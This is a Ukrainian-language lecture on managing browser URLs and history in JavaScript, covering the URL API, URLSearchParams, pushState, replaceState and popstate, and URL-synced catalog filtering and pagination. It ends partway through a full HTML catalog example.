# Лекція №17 (2 години). Керування URL-параметрами, історією браузера та клієнтська маршрутизація (URL API, History API).

## План лекції 

- концепція URL як джерела стану додатку - класифікація станів на клієнті (RAM, Web Storage, URL), еволюція від MPA до SPA та проблема збереження навігаційного контексту;
- анатомія веб-адреси та стандарт WHATWG URL API - структура URL, об'єкт `window.location`, конструктор `new URL()` та правила процентного кодування символів;
- робота з параметрами запиту через `URLSearchParams` - читання, модифікація, видалення та серіалізація пошукових параметрів і фільтрів;
- керування історією сесії за допомогою History API - стек історії браузера, методи `pushState()` і `replaceState()`, об'єкт `history.state` та обробка події `popstate`;
- алгоритми клієнтської фільтрації, сортування та пагінації - побудова конвеєра обробки даних, математика посторінкової нарізки (`slice`) та двостороння синхронізація стану з адресним рядком;
- основи клієнтської маршрутизації (Client-Side Routing) - порівняння Hash-роутингу та History-роутингу, проблема серверного фолбеку (404) та безпека обробки зовнішніх URL-параметрів.

## Перелік умовних скорочень

- **URL** (Uniform Resource Locator) - уніфікований локатор (адреса) ресурсу в мережі;
- **URI** (Uniform Resource Identifier) - уніфікований ідентифікатор ресурсу;
- **API** (Application Programming Interface) - інтерфейс прикладного програмування;
- **MPA** (Multi-Page Application) - класичний багатосторінковий веб-додаток;
- **SPA** (Single Page Application) - односторінковий веб-додаток, що працює без перезавантаження документа;
- **DOM** (Document Object Model) - об'єктна модель документа;
- **UI / UX** (User Interface / User Experience) - користувацький інтерфейс та користувацький досвід;
- **XSS** (Cross-Site Scripting) - міжсайтовий скриптинг (вразливість безпеки).

## Вступ

У попередній лекції ми вивчили Web Storage API (`localStorage` та `sessionStorage`) і навчилися створювати довготривалу «пам'ять» сторінки. Завдяки цьому інтернет-магазин або веб-додаток пам'ятає обрану користувачем темну тему, вміст кошика покупок та чернетку форми замовлення. Проте виникає фундаментальне архітектурне питання: **чи всі дані стану інтерфейсу варто зберігати у `localStorage`?**

Уявіть типову ситуацію: користувач зайшов у каталог інтернет-магазину, обрав категорію «Ноутбуки», відфільтрував товари за брендом, відсортував їх за зростанням ціни та перейшов на 3-тю сторінку результатів. Тепер він хоче надіслати посилання на цю вибірку колезі або зберегти сторінку в закладки браузера. Якщо поточна категорія, сортування та номер сторінки зберігаються виключно у змінних JavaScript або в `localStorage` на комп'ютері першого користувача, то в адресному рядку браузера залишиться базовий адрес `https://techshop.ua/index.html`. Коли колега відкриє це посилання, він побачить початковий невідфільтрований каталог на першій сторінці. Ба більше, якщо сам користувач натисне кнопку браузера «Назад», замість повернення з 3-ї сторінки каталогу на 2-гу браузер просто викине його з сайту на попередній веб-ресурс.

Для вирішення цього класу задач у сучасній веб-архітектурі використовується концепція **«URL як стан додатку» (URL as State)**. Браузер надає розробнику спеціалізовані інтерфейси — **URL API**, **`URLSearchParams`** та **History API**, — які дозволяють програмно зчитувати та змінювати адресний рядок і стек історії переходів **без перезавантаження сторінки**.

Мета цієї лекції — опанувати теоретичні засади та практичні механізми роботи з адресним рядком і стеком історії браузера, навчитися проєктувати клієнтську пагінацію, сортування й фільтрацію з повною синхронізацією стану через URL, а також зрозуміти принципи роботи клієнтських маршрутизаторів (роутерів) без сторонніх фреймворків.

---

## 1. Архітектура стану веб-додатку: MPA, SPA та роль URL

### 1.1. Три рівні клієнтського стану

Будь-який інтерактивний веб-додаток оперує даними, які визначають те, що саме бачить користувач на екрані в конкретну мить. З точки зору архітектури фронтенду всі клієнтські дані поділяються на три категорії залежно від місця їх зберігання та призначення:

- ефемерний стан у пам'яті (In-Memory / UI State) - зберігається у звичайних змінних JavaScript (`let`, `const`) в оперативній пам'яті вкладки; живе лише до перезавантаження сторінки і використовується для миттєвих локальних станів (чи відкрите випадаюче меню, чи наведено курсор на картку, поточний кадр анімації);
- приватний локальний стан пристрою (Persistent Local State) - зберігається у `localStorage`, `sessionStorage` або `IndexedDB`; прив'язаний до конкретного браузера на конкретному пристрої користувача і не передається через посилання (вміст кошика покупок, список обраного, вибрана темна чи світла тема, чернетки невідправлених форм);
- навігаційний та публічний стан (URL / Location State) - кодується безпосередньо в адресному рядку браузера (шлях `pathname`, параметри запиту `?search=...` та хеш `#...`); визначає, **який саме ресурс або зріз даних** зараз відображається (поточний розділ сайту, ID відкритого товару, пошуковий запит, активні фільтри, критерій сортування, номер сторінки пагінації).

Порівняльна таблиця механізмів зберігання стану на клієнті:

| Характеристика | Змінні JS (RAM) | Web Storage (`localStorage`) | Адресний рядок (URL) |
| :--- | :--- | :--- | :--- |
| **Збереження після F5** | Ні (скидається) | Так (безстроково) | Так (зчитується з адреси) |
| **Можливість поділитися посиланням** | Ні | Ні (ізольовано в браузері) | Так (повна відтворюваність стану) |
| **Робота кнопок «Назад / Вперед»** | Ні | Ні | Так (через стек History API) |
| **Збереження в закладки (Bookmarks)** | Ні | Ні | Так |
| **Типові приклади даних** | Стан відкриття тултіпа, завантажений кеш | Кошик, тема оформлення, токен, чернетка | Пошуковий запит, фільтри, сортування, номер сторінки |

### 1.2. Еволюція навігації: від MPA до SPA

Протягом перших десятиліть існування вебу домінувала архітектура **MPA (Multi-Page Application — багатосторінковий додаток)**. У класичному MPA кожна дія користувача — перехід у іншу категорію, зміна сортування чи клік на сторінку №2 — супроводжувалася стандартним переходом за посиланням `<a href="/catalog?page=2">`:

```text
Класична модель MPA (повне перезавантаження на кожен крок):
[Клік користувача] ──► [HTTP GET запит на сервер] ──► [Сервер формує новий HTML]
        ▲                                                        │
        └──── [Повне знищення старого DOM, завантаження CSS/JS] ◄┘
```

Такий підхід мав одну суттєву перевагу: браузер автоматично оновлював URL в адресному рядку та автоматично записував кожен крок у історію переходів. Проте він мав критичні недоліки для користувацького досвіду:

- повне перезавантаження сторінки - при кожному кліку екран біліє, заново парсяться стилі та скрипти, скидається позиція прокрутки та стан аудіо/відео плеєрів;
- надлишковий мережевий трафік - замість того, щоб отримати лише 10 нових товарів у форматі JSON (кілька кілобайтів), браузер щоразу завантажує всю HTML-оболонку з шапкою, підвалом і меню.

Із появою `fetch()` та динамічних маніпуляцій DOM індустрія перейшла до підходу **SPA (Single Page Application — односторінковий додаток)** та гібридних динамічних інтерфейсів. У цій моделі HTML-документ завантажується лише один раз, а при кліках на фільтри чи пагінацію JavaScript перехоплює подію (`event.preventDefault()`), фільтрує масив даних у пам'яті (або робить фоновий `fetch`-запит) і миттєво перемальовує лише контейнер `.products-grid`.

Проте відмова від стандартного перезавантаження сторінки породила нову проблему: **якщо ми блокуємо стандартний перехід за посиланням, браузер перестає змінювати URL в адресному рядку і не записує дії користувача в історію!** Саме тому в динамічних JavaScript-додатках обов'язязок синхронізації інтерфейсу з адресним рядком та історією браузера перекладається на самого розробника.

---

## 2. Анатомія веб-адреси та стандарт WHATWG URL API

### 2.1. Структура сучасного URL

Перш ніж програмно керувати адресою, необхідно чітко розуміти синтаксичну будову URL згідно зі стандартом WHATWG:

```text
https://shop.example.com:8080/catalog/laptops?brand=asus&sort=price_asc&page=2#reviews
└─┬─┘   └──────┬───────┘ └─┬┘└──────┬───────┘└───────────────┬───────────────┘└───┬──┘
protocol    hostname     port    pathname                 search                 hash
        └─────────┬──────────┘
                 host
└──────────────┬─────────────┘
             origin
```

Основні складові веб-адреси:
- `protocol` - схема звернення до ресурсу разом із двокрапкою (наприклад, `"https:"` або `"http:"`);
- `hostname` - доменне ім'я або IP-адреса сервера (`"shop.example.com"` або `"localhost"`);
- `port` - числовий номер мережевого порту (`"8080"`); якщо використовується стандартний порт (`80` для HTTP або `443` для HTTPS), у рядку він зазвичай опускається;
- `origin` - комбінація протоколу, хоста і порту (`"https://shop.example.com:8080"`), що визначає границю безпеки Same-Origin Policy;
- `pathname` - ієрархічний шлях до ресурсу або розділу на сервері, що завжди починається з прямого слеша (`"/catalog/laptops"`);
- `search` (Query String) - рядок параметрів запиту, що починається зі знака питання `?` і містить пари `ключ=значення`, розділені амперсандом `&` (`"?brand=asus&sort=price_asc&page=2"`);
- `hash` (Fragment Identifier) - якір або ідентифікатор фрагмента документа, що починається із символу решітки `#` (`"#reviews"`); важлива особливість хешу полягає в тому, що браузер ніколи не надсилає частину після `#` на сервер під час HTTP-запиту — вона призначена виключно для клієнта.

### 2.2. Об'єкт `window.location`

Глобальний об'єкт `window.location` (або `document.location`) відображає поточну адресу відкритої вкладки і дозволяє не лише читати окремі компоненти URL, а й ініціювати навігацію:

```javascript
// Читання компонентів поточної адреси сторінки
console.log(window.location.href);     // Повний URL-рядок
console.log(window.location.origin);   // "https://shop.example.com"
console.log(window.location.pathname); // "/catalog/laptops"
console.log(window.location.search);   // "?brand=asus&sort=price_asc&page=2"
console.log(window.location.hash);     // "#reviews"
```

Методи навігації об'єкта `location`:
- `location.assign(url)` (або пряме присвоєння `location.href = url`) - ініціює повноцінний перехід на нову адресу з перезавантаженням документа та додаванням запису в історію браузера;
- `location.replace(url)` - перенаправляє на нову сторінку з перезавантаженням, але **замінює** поточну сторінку в стеку історії (користувач не зможе повернутися назад кнопкою «Back» — часто використовується після редиректу з форми оплати);
- `location.reload()` - примусово перезавантажує поточний документ.

> [!WARNING]
> Будь-яка зміна властивостей `location.href`, `location.pathname` або `location.search` напряму через присвоєння (`window.location.search = "?page=2"`) негайно викликає **повне перезавантаження сторінки браузером** і скидання всіх JavaScript-змінних! Для зміни адреси без перезавантаження використовується виключно History API (Розділ 4).

### 2.3. Конструктор `new URL()`

Для зручного аналізу (парсингу), модифікації та конструювання будь-яких адрес у JavaScript існує вбудований клас `URL`:

```javascript
// 1. Створення об'єкта URL із повного абсолютного рядка
const parsedUrl = new URL("https://techshop.ua/catalog?category=monitors&page=3#specs");

console.log(parsedUrl.hostname); // "techshop.ua"
console.log(parsedUrl.pathname); // "/catalog"
console.log(parsedUrl.search);   // "?category=monitors&page=3"
console.log(parsedUrl.hash);     // "#specs"

// 2. Створення URL на основі відносного шляху та базового домену
const apiEndpoint = new URL("/api/v1/products", "https://techshop.ua");
console.log(apiEndpoint.href);   // "https://techshop.ua/api/v1/products"

// 3. Отримання об'єкта поточної сторінки для безпечної модифікації
const currentUrl = new URL(window.location.href);
```

Об'єкт `URL` також автоматично валідує синтаксис адреси: якщо передати в конструктор `new URL()` некоректний рядок без протоколу (і не вказати другий аргумент базового домену), JavaScript викине виняток `TypeError: Invalid URL`.

### 2.4. Процентне кодування символів (Percent-Encoding)

Згідно зі стандартом RFC 3986, адресний рядок URL може містити лише обмежений набір латинських літер, цифр та кількох безпечних спецсимволів (`-`, `_`, `.`, `~`). Пробіли, кириличні літери (український текст пошуку) та зарезервовані роздільники (`?`, `&`, `=`, `#`, `/`, `+`), якщо вони є частиною значення параметра, обов'язково мають бути закодовані у шістнадцятковому форматі UTF-8 зі знаком `%` (наприклад, пробіл стає `%20` або `+`, а символ `&` стає `%26`).

Подивіться, що станеться, якщо формувати URL вручну через шаблонні рядки без кодування:

```javascript
// НЕБЕЗПЕЧНИЙ АНТИПРИКЛАД: ручна конкатенація рядка запиту
const userQuery = "Кабель USB & Type-C 100%";
const brokenUrl = `https://techshop.ua/search?q=${userQuery}`;
// У результаті символ "&" розірве параметр "q", і браузер вирішить,
// що "Type-C 100%" — це окремий новий параметр, а знак "%" викличе помилку декодування!
```

Для ручного кодування в JavaScript існують дві пари глобальних функцій:
- `encodeURI(str)` / `decodeURI(str)` - кодує повний URL цілком (перетворює кирилицю та пробіли), але **не чіпає** структурні роздільники адреси (`:`, `/`, `?`, `&`, `=`, `#`);
- `encodeURIComponent(str)` / `decodeURIComponent(str)` - кодує окреме значення параметра, перетворюючи **абсолютно всі** спецсимволи, включно з `&`, `=`, `?`, `/` та `+`, щоб вони не зламали структуру запиту.

```javascript
const searchText = "Ноутбук Asus & HP";

// Кодування окремого параметра
const encodedParam = encodeURIComponent(searchText);
console.log(encodedParam);
// "Ноутбук" у UTF-8 + "%20Asus%20%26%20HP" (символ & перетворено на %26)

// Зворотне декодування
console.log(decodeURIComponent(encodedParam));
// "Ноутбук Asus & HP"
```

Проте на практиці при роботі з параметрами запиту викликати `encodeURIComponent` вручну майже ніколи не потрібно, оскільки сучасний інтерфейс `URLSearchParams` виконує все кодування та декодування повністю автоматично.

---

## 3. Керування параметрами запиту через `URLSearchParams`

### 3.1. Створення та читання параметрів

Інтерфейс **`URLSearchParams`** призначений спеціально для парсингу, читання, модифікації та конструювання рядка параметрів запиту (Query String). Він доступний як окремий конструктор або через властивість `.searchParams` об'єкта `URL`.

Способи ініціалізації `URLSearchParams`:
- з рядка запиту поточної сторінки: `new URLSearchParams(window.location.search)` (символ `?` на початку ігнорується автоматично);
- з об'єкта `URL`: `const url = new URL(window.location.href); const params = url.searchParams;`;
- зі звичайного JavaScript-об'єкта або масиву пар: `new URLSearchParams({ category: 'phones', page: '1' })`.

Основні методи читання даних із `URLSearchParams`:
- `get(name)` - повертає рядкове значення першого знайденого параметра з ключем `name`, або `null`, якщо такого параметра в URL немає;
- `getAll(name)` - повертає масив усіх значень, переданих під цим ключем (незамінний для чекбоксів мульти-фільтрації, наприклад `?brand=apple&brand=samsung`);
- `has(name)` - повертає булеве `true` або `false` залежно від того, чи присутній ключ у рядку запиту.

```javascript
// Припустимо, поточний рядок запиту:
// "?category=laptops&brand=asus&brand=lenovo&maxPrice=35000&inStock=true"
const params = new URLSearchParams("?category=laptops&brand=asus&brand=lenovo&maxPrice=35000&inStock=true");

// 1. Читання одиночних параметрів
const category = params.get("category"); // "laptops"
const sort = params.get("sort");         // null (параметр відсутній)

// 2. Усі значення з URLSearchParams завжди повертаються як РЯДКИ (string)!
// Тому для числових та булевих параметрів потрібне явне приведення типів:
const maxPrice = Number(params.get("maxPrice")) || Infinity; // 35000 (number)
const inStockOnly = params.get("inStock") === "true";        // true (boolean)

// 3. Читання множинних параметрів (мультиселект брендів)
const selectedBrands = params.getAll("brand");
console.log(selectedBrands); // ["asus", "lenovo"]

// 4. Перевірка наявності параметра
console.log(params.has("category")); // true
console.log(params.has("discount")); // false
```

### 3.2. Модифікація, видалення та серіалізація

Інтерфейс `URLSearchParams` надає зручні методи для зміни набору параметрів у пам'яті:

- `set(name, value)` - встановлює нове значення для параметра `name`; якщо такий параметр уже існував (навіть у кількох екземплярах), він перезаписується єдиним новим значенням;
- `append(name, value)` - додає нову пару `ключ=значення` в кінець запиту, не видаляючи попередні значення з таким самим ключем;
- `delete(name)` - повністю видаляє всі параметри з іменем `name`;
- `sort()` - сортує всі параметри в алфавітному порядку за назвою ключа (корисно для уніфікації URL та кешування);
- `toString()` - перетворює поточний набір параметрів назад у валідний закодований рядок запиту (без початкового знака `?`).

```javascript
const params = new URLSearchParams("?category=laptops&page=1");

// Змінюємо сторінку на 2
params.set("page", "2");

// Додаємо пошуковий запит кирилицею зі спецсимволами (кодується автоматично!)
params.set("q", "ігрова миша & килимок");

// Видаляємо параметр категорії (наприклад, користувач обрав "Усі категорії")
params.delete("category");

// Отримуємо готовий закодований рядок запиту
console.log(params.toString());
// "page=2&q=%D1%96%D0%B3%D1%80%D0%BE%D0%B2%D0%B0+%D0%BC%D0%B8%D1%88%D0%B0+%26+%D0%BA%D0%B8%D0%BB%D0%B8%D0%BC%D0%BE%D0%BA"
```

> [!TIP]
> **Правило чистих URL-адрес (Clean URLs):** Якщо користувач скинув фільтр на значення за замовчуванням (наприклад, обрав категорію «Усі», очистив поле пошуку до порожнього рядка `""` або повернувся на сторінку `1`), не залишайте в URL порожні хвости на зразок `?q=&category=all&page=1`. Видаляйте дефолтні параметри через `params.delete(key)` — тоді адресний рядок залишатиметься лаконічним і зрозумілим.

### 3.3. Ітерація та перетворення на об'єкт

Об'єкт `URLSearchParams` є ітерованим (iterable), тому його можна напряму перебирати в циклі `for...of` або миттєво перетворити на звичайний словник за допомогою `Object.fromEntries()`:

```javascript
const params = new URLSearchParams("?category=audio&sort=price_desc&page=3");

// 1. Перебір пар [ключ, значення] у циклі
for (const [key, value] of params) {
  console.log(`${key} -> ${value}`);
}

// 2. Конвертація у звичайний JavaScript-об'єкт одним рядком
const filterObject = Object.fromEntries(params);
console.log(filterObject);
// { category: "audio", sort: "price_desc", page: "3" }
```

---

## 4. Керування історією браузера: History API

### 4.1. Стек історії сесії (Session History Stack)

Кожна вкладка браузера веде власний хронологічний список відвіданих користувачем локацій — **стек історії сесії**. Коли ви переходите з однієї сторінки на іншу, нова адреса кладеться на вершину стека, а вказівник поточної позиції переміщується вперед.

```text
Стек історії вкладки при послідовних переходах:
[0] /index.html  ──►  [1] /index.html?category= monitors  ──►  [2] /index.html?category=monitors&page=2
                                                                     ▲
                                                         Поточна активна позиція
```

Якщо користувач натискає кнопку браузера «Назад» (або викликається `history.back()`), вказівник зміщується на позицію `[1]`. При цьому запис `[2]` не видаляється — користувач може повернутися до нього кнопкою «Вперед» (`history.forward()`). Проте якщо, перебуваючи на позиції `[1]`, користувач перейде за новим маршрутом (наприклад, відкриє категорію `keyboards`), вся «майбутня» гілка після позиції `[1]` відсікається і замінюється новим записом.

Базові властивості та методи навігації по стеку `window.history`:
- `history.length` - загальна кількість записів у стеку історії поточної вкладки;
- `history.back()` - програмний еквівалент натискання кнопки браузера «Назад» (перехід на 1 крок назад);
- `history.forward()` - програмний еквівалент натискання кнопки «Вперед»;
- `history.go(delta)` - перехід на вказану кількість кроків відносно поточної позиції (`history.go(-2)` — на дві сторінки назад, `history.go(0)` — перезавантаження).

### 4.2. Зміна URL без перезавантаження: `pushState()` та `replaceState()`

Головна сила стандарту HTML5 History API полягає у двох методах, які дозволяють змінювати URL в адресному рядку та модифікувати стек історії **без відправки HTTP-запиту на сервер і без перезавантаження DOM-дерева**:

- `history.pushState(stateObj, unused, url)` - створює **новий запис** у стеку історії сесії та змінює адресу в браузері на `url`; кнопка «Назад» стає активною і дозволяє повернутися до попереднього стану;
- `history.replaceState(stateObj, unused, url)` - **оновлює (перезаписує) поточний запис** у стеку історії та змінює адресу в браузері на `url`, не збільшуючи `history.length`.

Параметри обох методів:
- `stateObj` - довільний серіалізований JavaScript-об'єкт (до ~640 КБ — 2 МБ залежно від браузера), який асоціюється з цим записом історії і буде доступний через `history.state` або при поверненні назад; якщо додатковий об'єкт не потрібен, передають `null` або `{}`;
- `unused` - історичний параметр заголовка (`title`), який усі сучасні браузери ігнорують; за стандартом сюди завжди передають порожній рядок `""`;
- `url` - нова адреса (відносна або абсолютна в межах того самого домену `origin`), яка з'явиться в адресному рядку.

```javascript
// Формуємо нову адресу зі зміненими параметрами на базі поточного URL
const nextUrl = new URL(window.location.href);
nextUrl.searchParams.set("category", "smartphones");
nextUrl.searchParams.set("page", "1");

// Додаємо новий крок в історію та миттєво змінюємо адресний рядок БЕЗ перезавантаження!
history.pushState({ category: "smartphones", page: 1 }, "", nextUrl);
```

### 4.3. Коли використовувати `pushState`, а коли — `replaceState`?

Неправильний вибір між цими двома методами є однією з найпоширеніших UX-помилок у веб-розробці. Уявіть, що ви прив'язали `history.pushState()` до події `input` живого пошуку, і користувач ввів слово `"ноутбук"` (7 літер). У стек історії запишеться 7 окремих кроків: `?q=н`, `?q=но`, `?q=ноу`, ..., `?q=ноутбук`. Щоб вийти зі сторінки кнопкою «Назад», роздратованому користувачеві доведеться клікнути «Назад» 7 разів поспіль!

Архітектурне правило вибору методу:
- використовуйте `history.pushState()` для дискретних, усвідомлених навігаційних переходів користувача - перехід на іншу сторінку пагінації (`page=2` → `page=3`), перемикання категорії або табу, відкриття модального вікна конкретного товару;
- використовуйте `history.replaceState()` для частих потокових змін або технічної нормалізації - живий пошук під час набору тексту в полі вводу, рух повзунка діапазону цін (range slider), зміна порядку сортування або автоматичне виправлення некоректного URL при старті сторінки.

### 4.4. Обробка навігації «Назад / Вперед»: подія `popstate`

Коли ми викликаємо `history.pushState()`, адресний рядок змінюється, і ми одразу в нашому коді викликаємо функцію перемальовування каталогу `renderCatalog()`. Але що відбувається, коли користувач натискає системну кнопку браузера **«Назад»** або **«Вперед»**?

Браузер змінює адресу в адресному рядку на попередню зі стека історії і генерує на об'єкті `window` спеціальну подію **`popstate`**.

Критичні особливості життєвого циклу події `popstate`:
- подія `popstate` спрацьовує **виключно** під час переміщення по вже існуючій історії сесії (натискання кнопок браузера «Назад / Вперед» або виклик `history.back()`, `history.forward()`, `history.go()`);
- подія `popstate` **НІКОЛИ не спрацьовує** у момент виклику `history.pushState()` або `history.replaceState()`;
- у момент спрацювання `popstate` властивість `window.location.search` уже містить відновлений URL того кроку, на який повернувся користувач, а `event.state` містить об'єкт `stateObj`, переданий раніше у `pushState`.

```javascript
// Підписуємося на натискання кнопок браузера "Назад" та "Вперед"
window.addEventListener("popstate", (event) => {
  console.log("Навігація по історії! Поточний URL:", window.location.search);
  console.log("Відновлений об'єкт state:", event.state);

  // Зчитуємо параметри з оновленого window.location.search,
  // синхронізуємо елементи форм (інпути, селекти) та перемальовуємо товари:
  syncStateFromUrlAndRender();
});
```

---

## 5. Алгоритми клієнтської фільтрації, сортування та пагінації

### 5.1. Конвеєр обробки даних (Data Processing Pipeline)

Коли в каталозі одночасно працюють пошук за назвою, фільтр за категорією, сортування за ціною та посторінкова пагінація, вони не можуть виконуватися хаотично. Усі ці операції утворюють строгий послідовний конвеєр (Data Pipeline), де вихід попереднього етапу стає входом для наступного:

```text
[Повний масив allProducts (напр., 100 товарів)]
        │
        ▼  Етап 1: Фільтрація (.filter() за категорією, пошуковим запитом, ціною)
[Відфільтрований масив filteredProducts (напр., 23 товари)]
        │
        ▼  Етап 2: Сортування (.toSorted() або копія + .sort() за ціною чи назвою)
[Відсортований масив sortedProducts (23 товари у потрібному порядку)]
        │
        ▼  Етап 3: Пагінація (обчислення totalPages, .slice(startIndex, endIndex))
[Зріз поточної сторінки pageItems (напр., 6 товарів для сторінки №2)]
        │
        ▼  Етап 4: Рендеринг DOM (відображення 6 карток + кнопок пагінації 1..4)
```

Чому порядок етапів є критично важливим:
- не можна робити нарізку пагінації (`.slice()`) **до** фільтрації чи сортування - інакше ви відсортуєте лише 6 випадкових товарів поточної сторінки замість усього каталогу;
- загальна кількість сторінок пагінації (`totalPages`) завжди розраховується від довжини **відфільтрованого** масиву (`filteredProducts.length`), а не від усього каталогу `allProducts.length`;
- сортування методом `.sort()` мутує (змінює на місці) вихідний масив, тому перед сортуванням обов'язково створюють поверхневу копію `[...filteredProducts].sort(...)` або використовують сучасний немутуючий метод `filteredProducts.toSorted(...)`, щоб можна було повернутися до сортування «за замовчуванням».

### 5.2. Математика посторінкової пагінації

Для реалізації посторінкового виведення товарів на клієнті використовуються три базові величини:
- `totalItems` - кількість товарів після проходження всіх фільтрів (`filteredProducts.length`);
- `itemsPerPage` (або `limit`) - фіксована кількість карток на одній сторінці (наприклад, `6` або `8`);
- `currentPage` - поточний номер сторінки, запитаний користувачем або зчитаний із URL (`?page=2`).

Алгоритм обчислення параметрів пагінації:

```javascript
function paginateArray(items, requestedPage, itemsPerPage = 6) {
  const totalItems = items.length;

  // 1. Загальна кількість сторінок (округлення вгору через Math.ceil)
  // Якщо товарів 0, все одно вважаємо, що існує 1 порожня сторінка
  const totalPages = Math.max(1, Math.ceil(totalItems / itemsPerPage));

  // 2. Захисне обмеження номера сторінки (Clamping) у діапазоні [1 ... totalPages]
  // Захищає від некоректних URL на зразок ?page=-5 або ?page=999
  const safePage = Math.max(1, Math.min(Number(requestedPage) || 1, totalPages));

  // 3. Обчислення початкового та кінцевого індексів для методу slice()
  // Для сторінки 1: (1 - 1) * 6 = 0  -> slice(0, 6)   (індекси 0, 1, 2, 3, 4, 5)
  // Для сторінки 2: (2 - 1) * 6 = 6  -> slice(6, 12)  (індекси 6, 7, 8, 9, 10, 11)
  const startIndex = (safePage - 1) * itemsPerPage;
  const endIndex = startIndex + itemsPerPage;

  // 4. Вирізаємо елементи поточної сторінки без зміни вихідного масиву
  const pageItems = items.slice(startIndex, endIndex);

  return {
    pageItems,
    currentPage: safePage,
    totalPages,
    totalItems,
    hasPrevPage: safePage > 1,
    hasNextPage: safePage < totalPages
  };
}
```

> [!IMPORTANT]
> **Правило скидання сторінки при зміні фільтрів:** Коли користувач перебуває на сторінці `page = 4` і змінює категорію, вводить текст у пошук або змінює сортування, номер сторінки в стані та в URL **обов'язково має скидатися на `page = 1`**. Якщо залишити `page = 4`, а в новій категорії всього 5 товарів (тобто лише 1 сторінка), користувач опиниться на неіснуючій сторінці або побачить нерелевантний зріз.

---

## 6. Повний практичний приклад: Каталог із синхронізацією URL та History API

Розглянемо цілісну архітектуру каталогу товарів, де пошук, фільтр за категорією, сортування та пагінація повністю синхронізовані з `URLSearchParams` та `History API`. Цей код можна зберегти в окремий HTML-файл і протестувати у браузері.

```html
<!DOCTYPE html>
<html lang="uk">
<head>
  <meta charset="UTF-8">
  <title>Каталог із синхронізацією URL та History API</title>
  <style>
    body { font-family: system-ui, sans-serif; max-width: 900px; margin: 20px auto; padding: 0 16px; color: #212529; }
    .url-indicator { background: #e9ecef; padding: 10px 14px; border-radius: 6px; font-family: monospace; margin-bottom: 16px; word-break: break-all; }
    .controls { display: flex; flex-wrap: wrap; gap: 12px; margin-bottom: 20px; background: #f8f9fa; padding: 14px; border-radius: 8px; border: 1px solid #dee2e6; }
    .controls input, .controls select, .controls button { padding: 8px 12px; border: 1px solid #ced4da; border-radius: 6px; font-size: 14px; }
    .controls input { flex: 1; min-width: 200px; }
    .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(240px, 1fr)); gap: 16px; margin-bottom: 20px; }
    .card { border: 1px solid #dee2e6; border-radius: 8px; padding: 16px; background: #fff; }
    .card-category { font-size: 12px; color: #6c757d; text-transform: uppercase; }
    .card-price { font-size: 18px; font-weight: bold; color: #0d6efd; margin-top: 8px; }
    .pagination { display: flex; gap: 6px; align-items: center; justify-content: center; margin-top: 20px; }
    .page-btn { padding: 6px 12px; border: 1px solid #dee2e6; background: #fff; border-radius: 4px; cursor: pointer; }
    .page-btn.active { background: #0d6efd; color: #fff; border-color: #0d6efd; font-weight: bold; }
    .page-btn:disabled { opacity: 0.5; cursor: not-allowed; }
  </style>
</head>
<body>

  <h2>Інтерактивний каталог (URLSearchParams + History API)</h2>
  <div class="url-indicator" id="urlPreview">Поточний URL: </div>

  <!-- Панель керування фільтрами та сортуванням -->
  <div class="controls">
    <input type="search" id="searchInput" placeholder="Пошук за назвою...">

    <select id="categorySelect">
      <option value="all">Усі категорії</option>
      <option value="laptops">Ноутбуки</option>
      <option value="accessories">Аксесуари</option>
      <option value="monitors">Монітори</option>
    </select>

    <select id="sortSelect">
      <option value="default">За замовчуванням</option>
      <option value="price_asc">Від дешевших до дорожчих</option>
      <option value="price_desc">Від дорожчих до дешевших</option>
      <option value="title_asc">За назвою (А → Я)</option>
    </select>

    <button type="button" id="resetFiltersBtn">Скинути все</button>
  </div>

  <p id="resultsCounter"></p>
  <div class="grid" id="catalogGrid"></div>
  <div class="pagination" id="paginationContainer"></div>

  <script>
    // 1. Тестовий набір товарів каталогу
    const PRODUCTS = [
      { id: 1, title: "Ноутбук ASUS VivoBook 15", category: "laptops", price: 24500 },
      { id: 2, title: "Бездротова миша Logitech MX Master", category: "accessories", price: 3800 },
      { id: 3, title: "Монітор Dell UltraSharp 27", category: "monitors", price: 16200 },
      { id: 4, title: "Ноутбук Apple MacBook Air M2", category: "laptops", price: 46900 },
      { id: 5, title: "Механічна клавіатура Keychron K2", category: "accessories", price: 4200 },
      { id: 6, title: "Монітор LG UltraGear 24 IPS", category: "monitors", price: 8900 },
      { id: 7, title: "Ноутбук Lenovo IdeaPad Gaming 3", category: "laptops", price: 32000 },
      { id: 8, title: "Навушники Sony WH-1000XM5", category: "accessories", price: 13500 },
      { id: 9, title: "Монітор Samsung Odyssey G5", category: "monitors", price: 11400 },
      { id: 10, title: "USB-хаб Baseus 7-in-1 Type-C", category: "accessories", price: 1650 }
    ];

    const ITEMS_PER_PAGE = 4;

    // 2. Єдиний об'єкт стану фільтрів каталогу ( за замовчуванням )
    const catalogState = {
      q: "",
      category: "all",
      sort: "default",
      page: 1
    };

    // Посилання на DOM-елементи
    const searchInput = document.getElementById("searchInput");
    const categorySelect = document.getElementById("categorySelect");
    const sortSelect = document.getElementById("sortSelect");
    const resetFiltersBtn = document.getElementById("resetFiltersBtn");
    const catalogGrid = document.getElementById("catalogGrid");
    const paginationContainer = document.getElementById("paginationContainer");
    const resultsCounter = document.getElementById("resultsCounter");
    const urlPreview = document.getElementById("urlPreview");

    // 3. Зчитування параметрів із адресного рядка у catalogState (URL -> State -> Controls)
    function readStateFromUrl() {
      const params = new URLSearchParams(window.location.search);

      catalogState.q = (params.get("q") || "").trim();
      catalogState.category = params.get("category") || "all";
      catalogState.sort = params.get("sort") || "default";
      catalogState.page = Math.max(1, parseInt(params.get("page"), 10) || 1);

      // Синхронізуємо значення полів вводу у DOM зі зчитаним станом
      searchInput.value = catalogState.q;
      categorySelect.value = catalogState.category;
      sortSelect.value = catalogState.sort;
    }

    // 4. Запис поточного стану catalogState в адресний рядок (State -> URL)
    function writeStateToUrl(replace = false) {
      const params = new URLSearchParams();

      // Додаємо в URL лише ті параметри, які відрізняються від дефолтних (Clean URLs)
      if (catalogState.q.length > 0) {
        params.set("q", catalogState.q);
      }
      if (catalogState.category !== "all") {
        params.set("category", catalogState.category);
      }
      if (catalogState.sort !== "default") {
        params.set("sort", catalogState.sort);
      }
      if (catalogState.page > 1) {
        params.set("page", String(catalogState.page));
      }

      const queryString = params.toString();
      const newRelativeUrl = queryString
        ? `${window.location.pathname}?${queryString}`
        : window.location.pathname;

      // Використовуємо replaceState для швидкого пошуку або pushState для кліків навігації
      try {
        if (replace) {
          history.replaceState({ ...catalogState }, "", newRelativeUrl);
        } else {
          history.pushState({ ...catalogState }, "", newRelativeUrl);
        }
      } catch (e) {
        // При відкритті локального файлу за протоколом file:// деякі браузери обмежують pushState
